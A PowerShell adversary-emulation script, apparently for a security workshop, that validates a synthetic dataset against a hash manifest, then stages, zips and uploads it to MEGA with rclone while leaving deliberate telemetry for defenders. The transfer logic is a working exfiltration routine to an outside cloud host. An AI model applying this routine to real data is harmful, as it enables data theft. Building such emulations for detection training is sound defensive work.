# Manually staged and bounded transfer of manifest-verified synthetic files.
[CmdletBinding()]
param(
    [switch]$ValidateOnly,
    [switch]$AddNoise
)

$ErrorActionPreference = 'Stop'
$root = Join-Path $env:LOCALAPPDATA 'CSWorkshop'
$docs = Join-Path $root 'ClientDocuments'
$marker = Join-Path $root '.synthetic-only'
$manifest = Join-Path $root 'dataset-manifest.csv'
$signature = 'CSWORKSHOP-SYNTHETIC-ONLY'
$bin = Join-Path $root 'bin'
$rclone = Join-Path $bin 'rclone.exe'
$config = Join-Path $root 'rclone.conf'

if (-not (Test-Path -LiteralPath $marker) -or
    (Get-Content -LiteralPath $marker -Raw).Trim() -ne $signature) {
    throw 'Missing synthetic dataset marker. Run prepare.ps1 first.'
}
if (-not (Test-Path -LiteralPath $docs) -or -not (Test-Path -LiteralPath $manifest)) {
    throw 'Missing synthetic documents or dataset manifest.'
}
$entries = @(Get-ChildItem -LiteralPath $docs -Recurse -Force)
if (@($entries | Where-Object { $_.Attributes -band [IO.FileAttributes]::ReparsePoint }).Count -gt 0) {
    throw 'Links and junctions are prohibited in the workshop dataset.'
}
$files = @($entries | Where-Object { -not $_.PSIsContainer })
$rows = @(Import-Csv -LiteralPath $manifest)
if ($rows.Count -eq 0 -or $rows.Count -ne $files.Count) {
    throw 'Dataset differs from the manifest (file count mismatch).'
}

$allowed = @{}
foreach ($row in $rows) {
    $rel = [string]$row.RelativePath
    if ([string]::IsNullOrWhiteSpace($rel) -or
        [IO.Path]::IsPathRooted($rel) -or
        $rel -match '(^|[\\/])\.\.([\\/]|$)') {
        throw "Invalid relative path in manifest: $rel"
    }
    if ($allowed.ContainsKey($rel)) { throw "Duplicate manifest path: $rel" }
    $path = Join-Path $docs $rel
    if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {
        throw "Missing synthetic file: $rel"
    }
    $file = Get-Item -LiteralPath $path
    if ($file.Length -ne [int64]$row.SizeBytes -or
        (Get-FileHash -LiteralPath $path -Algorithm SHA256).Hash -ne $row.SHA256) {
        throw "Dataset integrity failure: $rel"
    }
    $allowed[$rel] = $true
}
foreach ($file in $files) {
    $rel = $file.FullName.Substring($docs.Length + 1)
    if (-not $allowed.ContainsKey($rel)) { throw "Unexpected file: $rel" }
}

Write-Host "[OK] Dataset validated: $($files.Count) synthetic files"
if ($ValidateOnly) { return }
if (-not $env:MEGA_EMAIL -or -not $env:MEGA_PASSWORD) {
    throw 'MEGA_EMAIL and MEGA_PASSWORD must be set in this PowerShell session.'
}

# Pinned to the Rclone version tested previously in the workshop.
$version = 'v1.75.2'
$zipName = "rclone-$version-windows-amd64.zip"
$zipSHA256 = '8A9DB2BAD1DC79A65B3348FD857069598E2AAB7CF4D118B77B1DF23055AFF818'
if (-not (Test-Path -LiteralPath $rclone)) {
    $zip = Join-Path $root $zipName
    $unpack = Join-Path $root '_rclone-download'
    New-Item -ItemType Directory -Path $bin, $unpack -Force | Out-Null
    Write-Host '[+] Downloading Rclone archive'
    Invoke-WebRequest -UseBasicParsing -Uri "https://downloads.rclone.org/$version/$zipName" -OutFile $zip
    if ((Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash -ne $zipSHA256) {
        throw 'Downloaded Rclone ZIP does not match the pinned SHA256.'
    }
    Expand-Archive -LiteralPath $zip -DestinationPath $unpack -Force
    $source = Get-ChildItem -LiteralPath $unpack -Filter rclone.exe -Recurse -File |
        Select-Object -First 1
    if (-not $source) { throw 'Rclone executable missing from ZIP.' }
    Copy-Item -LiteralPath $source.FullName -Destination $rclone -Force
    Remove-Item -LiteralPath $zip -Force
    Remove-Item -LiteralPath $unpack -Recurse -Force
}
& $rclone version | Out-Host
if ($LASTEXITCODE -ne 0) { throw 'Rclone execution failed. Review EDR prevention.' }

# Obfuscation prevents casual display, but it is not credential encryption.
$obscured = ($env:MEGA_PASSWORD | & $rclone obscure -)
if ($LASTEXITCODE -ne 0 -or -not $obscured) { throw 'Rclone password setup failed.' }
$content = @"
[workshopmega]
type = mega
user = $env:MEGA_EMAIL
pass = $obscured
use_https = true
"@
[System.IO.File]::WriteAllText(
    $config, $content, [System.Text.UTF8Encoding]::new($false)
)

$run = (Get-Date -Format 'yyyyMMdd-HHmmss') + '-' + [guid]::NewGuid().ToString('N').Substring(0, 6)
$staging = Join-Path $root "staging-$run"
$archive = Join-Path $root "client-data-$run.zip"
$log = Join-Path $root "transfer-$run.log"
$probe = Join-Path $root "probe-$run.txt"
$remoteDir = "workshopmega:CSWorkshop/$env:COMPUTERNAME/$run"
$runDir = Join-Path $root 'runs'
New-Item -ItemType Directory -Path $runDir -Force | Out-Null
$runFile = Join-Path $runDir "$run.json"

# Bounded deliberate operator error, no external systems are touched.
if ($AddNoise) {
    Write-Host '[+] Simulating a failed collection from a nonexistent local path'
    $missing = Join-Path $root 'Old-Client-Share'
    & robocopy.exe $missing (Join-Path $root "abandoned-$run") /E /R:0 /W:0 | Out-Null
    Write-Host "[+] Robocopy failed as expected (exit $LASTEXITCODE)"
}

# Leaves command-line telemetry and a recoverable file listing.
$cmdLine = 'dir /s /b "' + $docs + '"'
& cmd.exe /d /c $cmdLine 2>&1 |
    Out-File -LiteralPath (Join-Path $root "discovery-$run.txt") -Encoding UTF8

Write-Host '[+] Collecting files with Robocopy'
& robocopy.exe $docs $staging /E /XJ /R:0 /W:0 | Out-Host
if ($LASTEXITCODE -ge 8) { throw 'Document staging failed.' }

Write-Host '[+] Creating ZIP archive with Tar'
& tar.exe -a -cf $archive -C $staging .
if ($LASTEXITCODE -ne 0) { throw 'Archive creation failed.' }

$hash = (Get-FileHash -LiteralPath $archive -Algorithm SHA256).Hash
$meta = [pscustomobject]@{
    RunId = $run
    Host = $env:COMPUTERNAME
    RemoteDir = $remoteDir
    ArchiveSha256 = $hash
    ArchiveBytes = (Get-Item -LiteralPath $archive).Length
    ProbeUploaded = $false
    Uploaded = $false
    TimestampUtc = [datetime]::UtcNow.ToString('o')
}
$meta | ConvertTo-Json | Set-Content -LiteralPath $runFile -Encoding UTF8
Set-Content -LiteralPath (Join-Path $root 'last-run.txt') -Value $run -Encoding ASCII
Set-Content -LiteralPath $probe -Value ($signature + [Environment]::NewLine + "Synthetic probe for run $run") -Encoding ASCII

Write-Host '[+] Uploading small probe'
& $rclone --config $config copyto $probe "$remoteDir/probe.txt" --log-level INFO --log-file $log
if ($LASTEXITCODE -ne 0) { throw "Probe upload failed; check $log" }
$meta.ProbeUploaded = $true
$meta | ConvertTo-Json | Set-Content -LiteralPath $runFile -Encoding UTF8

Write-Host '[+] Uploading synthetic archive to MEGA'
& $rclone --config $config copyto $archive "$remoteDir/client-data.zip" --log-level INFO --log-file $log
if ($LASTEXITCODE -ne 0) { throw "Archive upload failed; check $log" }

& $rclone --config $config ls $remoteDir
if ($LASTEXITCODE -ne 0) { throw 'Remote listing failed.' }
$meta.Uploaded = $true
$meta | ConvertTo-Json | Set-Content -LiteralPath $runFile -Encoding UTF8

Write-Host "[OK] Run ID: $run"
Write-Host "[OK] Remote: $remoteDir"
Write-Host "[OK] Archive SHA256: $hash"
Write-Host "[OK] Run metadata: $runFile"
